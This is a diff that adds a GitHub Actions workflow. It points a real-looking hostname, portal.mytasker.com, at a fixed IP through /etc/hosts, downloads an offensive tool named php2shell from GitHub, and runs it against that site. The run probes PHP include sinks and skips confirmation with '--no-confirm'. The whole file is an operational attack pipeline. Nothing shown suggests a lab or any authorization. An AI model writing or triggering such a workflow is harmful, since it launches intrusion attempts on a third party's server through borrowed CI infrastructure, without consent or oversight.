@@ -1,0 +1,30 @@
+name: fp
+on:
+  workflow_dispatch:
+    inputs:
+      host:
+        description: vhost
+        default: "portal.mytasker.com"
+      path:
+        description: probe path
+        default: "/index.php"
+      sink:
+        description: "1 = also scan for include sinks"
+        default: "1"
+
+jobs:
+  fp:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: pin origin
+        run: sudo sh -c 'echo "69.49.247.128 ${{ inputs.host }}" >> /etc/hosts'
+      - name: tool
+        run: |
+          git clone -q https://github.com/Masriyan/php2shell /tmp/t
+          python3 -m pip install -q requests
+      - name: run
+        run: |
+          cd /tmp/t
+          if [ "${{ inputs.sink }}" = "1" ]; then S="--sink-scan"; else S=""; fi
+          timeout 240 python3 php2shell.py --url "https://${{ inputs.host }}" --probe-path "${{ inputs.path }}" --no-confirm $S 2>&1 | tail -80
